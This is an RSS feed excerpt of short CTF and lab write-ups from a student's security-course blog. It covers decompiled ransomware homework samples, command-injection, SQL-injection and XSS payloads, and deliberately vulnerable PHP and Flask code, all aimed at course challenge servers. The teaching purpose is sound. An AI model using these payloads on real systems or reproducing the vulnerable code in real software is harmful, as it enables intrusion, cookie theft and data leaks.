跟進去後的sub_401550()
&lt;img src="https://hackmd.io/_uploads/Sy3R6Vbth.png" alt="" />
:::spoiler Decrypt Hidden Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">sub_401550&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+Ch] [rbp-4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x3FFF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">+=&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">^=&lt;/span> byte_404020[i &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</guid><description>&lt;h1 id="simple-reverse-0x302023-hw---baby-ransom-1">
 Simple Reverse 0x30(2023 HW - Baby Ransom 1)
 &lt;a class="anchor" href="#simple-reverse-0x302023-hw---baby-ransom-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesw">SetFileAttributesW 函式&lt;/a>
&lt;a href="http://stenwang.blogspot.com/2015/09/schtasks.html">Schtasks 工作排程 &lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-findresourcea">FindResourceA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 StackBase = NtCurrentTeb()-&amp;gt;NtTib.StackBase;
 while ( 1 )
 {
 DestInitValue = _InterlockedCompareExchange64(&amp;amp;qword_140017050, StackBase, 0i64);
 if ( !DestInitValue )
 {
 v5 = 0;
 goto LABEL_7;
 }
 if ( StackBase == DestInitValue )
 break;
 Sleep(1000u);
 }
 v5 = 1;
LABEL_7:
 if ( unk_140017058 == 1 )
 {
 amsg_exit(31i64);
 }
 else if ( unk_140017058 )
 {
 dword_140017008 = 1;
 }
 else
 {
 unk_140017058 = 1;
 initterm(&amp;amp;qword_140019018, qword_140019028);
 }
 if ( unk_140017058 == 1 )
 {
 initterm(&amp;amp;qword_140019000, &amp;amp;qword_140019010);
 unk_140017058 = 2;
 }
 if ( !v5 )
 _InterlockedExchange64(&amp;amp;qword_140017050, 0i64);
 if ( TlsCallback_0 )
 TlsCallback_0(0i64, 2);
 sub_14000226B();
 v6 = 0i64;
 qword_1400170E0 = SetUnhandledExceptionFilter(&amp;amp;loc_140002530);
 (InterlockedExchange64)(nullsub_1);
 InitFloatUnit();
 v7 = dword_140017028;
 space = malloc(8i64 * (dword_140017028 + 1));
 v9 = qword_140017020;
 space_cp = space;
 while ( v7 &amp;gt; v6 )
 {
 size = strlen(*(v9 + 8 * v6)) + 1;
 dest = malloc(size);
 *(space_cp + 8 * v6) = dest;
 src = *(v9 + 8 * v6++);
 qmemcpy(dest, src, size);
 }
 qword_140017020 = space_cp;
 if ( v7 &amp;lt; 0 )
 v7 = 0i64;
 *(space_cp + 8 * v7) = 0i64;
 sub_140001F1E();
 _initenv = qword_140017018;
 dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 =&amp;gt; 0x254CA9C1580
 if ( !dword_14001700C )
 exit(dword_140017010);
 if ( !dword_140017008 )
 cexit();
 return dword_140017010;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA NetworkConfig_1DBB&lt;/p></description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</guid><description>&lt;h1 id="simple-reverse-0x312023-hw---baby-ransom-2">
 Simple Reverse 0x31(2023 HW - Baby Ransom 2)
 &lt;a class="anchor" href="#simple-reverse-0x312023-hw---baby-ransom-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://forum.butian.net/share/2204">SystemFunction033&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA WinMain&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
 HWND hWnd; // [rsp+60h] [rbp-A8h]
 WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
 struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

 memset(&amp;amp;WndClass, 0, sizeof(WndClass));
 WndClass.lpfnWndProc = (WNDPROC)store_winword;
 WndClass.hInstance = hInstance;
 WndClass.lpszClassName = Caption;
 WndClass.hbrBackground = CreateSolidBrush(0);
 if ( !RegisterClassW(&amp;amp;WndClass) )
 return 1;
 hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
 if ( !hWnd )
 return 2;
 MainPayload();
 ShowWindow(hWnd, nShowCmd);
 memset(&amp;amp;Msg, 0, sizeof(Msg));
 while ( GetMessageW(&amp;amp;Msg, 0i64, 0, 0) )
 {
 TranslateMessage(&amp;amp;Msg);
 DispatchMessageW(&amp;amp;Msg);
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA MainPayload&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
 Simple Web - 0x02(Lab - Whois Tool)
 &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://whoistool.ctf.zoolab.org/">https://whoistool.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Almost the same as &lt;a href="https://bernie6401.github.io/7x0Gr0C_QEahfS_QaTLYTg">0x10(Lab - DNS Lookup Tool | WAF)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if(isset($_GET[&amp;#34;host&amp;#34;])){
 $host = $_GET[&amp;#34;host&amp;#34;];
 if(strlen($host) &amp;gt; 15)
 echo &amp;#34;Host name tooooooo logn!!&amp;#34;;
 else
 echo `whois &amp;#34;{$host}&amp;#34; 2&amp;gt;&amp;amp;1;`;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
&lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
 Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
 &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---sqli">
 Exploit - SQLi
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;h3 id="easy-way---sqlmap">
 Easy way - &lt;code>SQLmap&lt;/code>
 &lt;a class="anchor" href="#easy-way---sqlmap">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./sqlmap.py &amp;#34;https://login.ctf.zoolab.org/&amp;#34; --form -dbs sqlite --dump --risk=3 --level=5
...
---
Parameter: username (POST)
 Type: time-based blind
 Title: SQLite &amp;gt; 2.0 AND time-based blind (heavy query)
 Payload: username=&amp;#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||&amp;#39;&amp;amp;password=
---
&lt;/code>&lt;/pre>&lt;h3 id="hard-way---tryerror">
 Hard way - try&amp;amp;error
 &lt;a class="anchor" href="#hard-way---tryerror">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Check if it has &lt;code>sqli&lt;/code> problem
Payload: &lt;code>union'&lt;/code>
&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
 Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
 &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config[&amp;#34;SQLALCHEMY_DATABASE_URI&amp;#34;] = &amp;#34;sqlite:///app.db&amp;#34;
db.init_app(app)

with app.app_context():
 db.session.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS users(
 id Integer PRIMARY KEY,
 username String NOT NULL UNIQUE,
 password String,
 count Integer DEFAULT 0
 );
 &amp;#34;&amp;#34;&amp;#34;)
 db.session.execute(&amp;#34;INSERT OR REPLACE INTO users (username, password) VALUES (&amp;#39;admin&amp;#39;, &amp;#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&amp;#39;)&amp;#34;)
 db.session.commit()

def login(greet):
 if not greet:
 return send_file(&amp;#39;app.py&amp;#39;, mimetype=&amp;#39;text/plain&amp;#39;)
 else:
 return render_template_string(f&amp;#34;Hello {greet}&amp;#34;)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def index():
 if request.method == &amp;#34;GET&amp;#34;:
 return render_template(&amp;#39;index.html&amp;#39;)
 else:
 username = request.form.get(&amp;#39;username&amp;#39;, &amp;#39;&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;, &amp;#39;&amp;#39;)
 error = &amp;#39;&amp;#39;
 user = db.session.execute(&amp;#34;SELECT username, password FROM users where username=:username&amp;#34;, {&amp;#34;username&amp;#34;:username}).first()

 if user and user[1] == password:
 return login(request.form.get(&amp;#39;greet&amp;#39;, &amp;#39;&amp;#39;))
 elif not user:
 error += &amp;#34;User doesn&amp;#39;t exist! &amp;#34;

 # New feature! count login failed event
 db.session.execute(&amp;#34;UPDATE users SET count = count + 1 WHERE username=:username&amp;#34;, {&amp;#34;username&amp;#34;: username})
 db.session.commit()
 count = db.session.execute(f&amp;#34;SELECT * FROM users WHERE username=&amp;#39;{username}&amp;#39;&amp;#34;).first() or [0, 0, 0, 0]
 error += f&amp;#39;Login faild count: {count[3]}&amp;#39;

 return render_template(&amp;#39;index.html&amp;#39;, error=error)


if __name__ == &amp;#34;__main__&amp;#34;:
 app.run(host=&amp;#34;0.0.0.0&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
 Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
 &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://particles.ctf.zoolab.org">https://particles.ctf.zoolab.org&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>The website can change the theme of layout. The main goal is to leak admin&amp;rsquo;s cookie.&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---xss">
 Exploit - XSS
 &lt;a class="anchor" href="#exploit---xss">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use burp suit to check if the website has XSS vulnerability.
&lt;img src="https://i.imgur.com/eu4Qqrs.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Try to modify &lt;code>config&lt;/code> parameter
Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
:::spoiler Response 1&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 url.value = location; config.value = &amp;#39;1;
 alert(123);
 console.log({x://\&amp;#39;; fetch(&amp;#39;/1;alert(123);console.log({x://\.json&amp;#39;).then(r =&amp;gt; r.json()).then(json =&amp;gt; {
 particlesJS(&amp;#34;particles-js&amp;#34;, json)
 })
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>:::
or
Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
 Simple Web - 0x09(Lab - Simple Note)
 &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://note.ctf.zoolab.org/">https://note.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.wibibi.com/info.php?tid=402">&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const id = location.pathname.split(&amp;#39;/&amp;#39;).pop();

 fetch(`/api/note/${id}`).then(r =&amp;gt; r.json()).then(({ title, content })=&amp;gt;{
 url.value = location;
 titleNode.innerHTML = title;
 contentNode.innerText = content;
 }); 
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
&lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
 Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9000/">http://h4ck3r.quest:9000/&lt;/a>&lt;/p>
&lt;h2 id="exploit---gitleak--basic-git-command">
 Exploit - gitleak + basic Git command
 &lt;a class="anchor" href="#exploit---gitleak--basic-git-command">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the extension of Firefox(or Google), &lt;code>Dotgit&lt;/code>, to check if the website actually has &lt;code>git leak problem&lt;/code>
&lt;img src="https://i.imgur.com/ZtMbj9z.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>denny0223/scrabble
To use scrabble tool to leak information&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/denny0223/scrabble.git
$ cd scrabble
$ sudo ./scrabble http://h4ck3r.quest:9000/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Still no flag
There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
 Simple Web 0x01(Lab - Hello from Windows 98)
 &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://windows.ctf.zoolab.org/">https://windows.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;p>Very similar to &lt;a href="https://bernie6401.github.io/nGAjlvyURtOcRBW1XfCfOA">0x07(Lab - &lt;code>HakkaMD&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 session_start();
 if(isset($_GET[&amp;#39;source&amp;#39;])){
 highlight_file(&amp;#39;./&amp;#39;.$_GET[&amp;#39;source&amp;#39;].&amp;#39;.php&amp;#39;);
 die();
 }
 if(isset($_GET[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;name&amp;#39;]!=&amp;#39;&amp;#39;){
 $_SESSION[&amp;#39;name&amp;#39;] = $_GET[&amp;#39;name&amp;#39;];
 header(&amp;#34;Location: /?page=hi.php&amp;#34;);
 die();
 }
 if(!isset($_GET[&amp;#39;page&amp;#39;])){
 header(&amp;#34;Location: /?page=say.php&amp;#34;);
 die();
 }
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;Hello from Windows 98&amp;lt;/title&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://unpkg.com/98.css&amp;#34; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;style&amp;gt;
 body{
 background: url(&amp;#39;blue.png&amp;#39;);
 background-size: cover;
 display: flex;
 align-items: center;
 justify-content: center;
 height: 100vh;
 margin: 0;
 }
&amp;lt;/style&amp;gt;
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;window&amp;#34; style=&amp;#34;margin: 32px; width: 500px&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-text&amp;#34;&amp;gt;
 Hello World..
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-controls&amp;#34;&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Minimize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Maximize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Close&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;window-body&amp;#34;&amp;gt;
 &amp;lt;?php include($_GET[&amp;#39;page&amp;#39;]);?&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
 Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9001/">http://h4ck3r.quest:9001/&lt;/a>&lt;/p>
&lt;h2 id="exploit---ds_store">
 Exploit - &lt;code>.DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---ds_store">#&lt;/a>
&lt;/h2>
&lt;p>Clone &lt;code>lijiejie/ds_store_exp&lt;/code>&lt;/p>
